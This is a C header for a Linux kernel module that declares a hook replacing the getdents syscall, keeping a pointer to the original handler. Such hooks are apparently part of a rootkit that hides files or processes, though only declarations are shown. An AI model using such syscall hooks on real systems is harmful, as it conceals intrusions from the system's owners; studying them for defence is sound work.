#ifndef GETDENTS_HOOK_H
#define GETDENTS_HOOK_H

#include <linux/dirent.h>
#include <linux/ptrace.h>   
#include <linux/slab.h>     
#include <linux/uaccess.h>  
#include <linux/string.h>   
#include <linux/kstrtox.h>  
#include <linux/mm.h>       
#include <linux/sched/task.h>
#include <linux/printk.h>   


extern asmlinkage long (*orig_getdents)(const struct pt_regs *);

extern asmlinkage int hook_getdents(const struct pt_regs *regs);

#endif // GETDENTS_HOOK_H

